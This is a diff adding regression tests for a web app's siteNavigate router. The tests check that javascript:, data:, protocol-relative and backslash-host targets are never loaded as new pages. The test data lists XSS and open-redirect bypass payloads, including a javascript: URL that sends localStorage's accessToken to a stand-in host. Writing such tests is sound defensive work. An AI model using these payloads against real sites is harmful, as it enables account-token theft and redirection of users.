@@ -175,6 +175,59 @@ describe("while a site with languages is on screen", () => {
   });
 });
 
+/**
+ * Header, footer, hero and media-showcase targets reach siteNavigate as
+ * authored (by hand, by API or in an AI draft). The router loads an absolute
+ * URL given as `href` as a new page (window.location), which would run a
+ * "javascript:" target — so these always go by `to`, as before languages.
+ */
+describe("a target with a scheme or a host", () => {
+  const ABSOLUTE = [
+    "javascript:fetch(`//x.example/`+localStorage.getItem(`accessToken`))//?a",
+    "JavaScript:alert(1)//?a",
+    " javascript:alert(1)//?a",
+    "java\tscript:alert(1)//?a",
+    "\u0000javascript:alert(1)//#a",
+    " javascript:alert(1)//?a",
+    "data:text/html,<script>alert(1)</script>?a",
+    "https://evil.example/?a",
+    "mailto:someone@example.com?subject=hi",
+    "//evil.example/?a",
+    "/\\evil.example?a",
+    "\\\\evil.example?a",
+    "/\t/evil.example?a",
+    " //evil.example?a",
+  ];
+
+  it("always goes by `to`, even while a language is carried", () => {
+    holdForTest();
+    for (const target of ABSOLUTE) {
+      expect(siteNavigateOptions(target, { lang: "hi" }), JSON.stringify(target)).toEqual({ to: target });
+    }
+  });
+
+  it("stays a path inside the app (no window.location load)", async () => {
+    holdForTest();
+    for (const target of ABSOLUTE) {
+      const { router, history } = await start("/new/about?lang=hi");
+      // With `href` the router would assign window.location — absent here, so
+      // that would throw instead of resolving.
+      await siteNavigate(router, target);
+      expect(addressOf(history).startsWith("/"), JSON.stringify(target)).toBe(true);
+    }
+  });
+
+  it("leaves site addresses with their own query string or #hash on `href`", () => {
+    holdForTest();
+    expect(siteNavigateOptions("/new/courses?stream=x", { lang: "hi" })).toEqual({ href: "/new/courses?stream=x" });
+    expect(siteNavigateOptions("courses?stream=x", { lang: "hi" })).toEqual({ href: "courses?stream=x" });
+    expect(siteNavigateOptions("/new/about#team", { lang: "hi" })).toEqual({ href: "/new/about#team" });
+    // A colon after the first "/" or "?" is not a scheme.
+    expect(siteNavigateOptions("/new/courses?at=10:30", { lang: "hi" })).toEqual({ href: "/new/courses?at=10:30" });
+    expect(siteNavigateOptions("courses/a:b?x=1", { lang: "hi" })).toEqual({ href: "courses/a:b?x=1" });
+  });
+});
+
 describe("holdSiteLanguage", () => {
   it("counts every holder, and a release is good for one call only", () => {
     expect(isSiteLanguageHeld()).toBe(false);
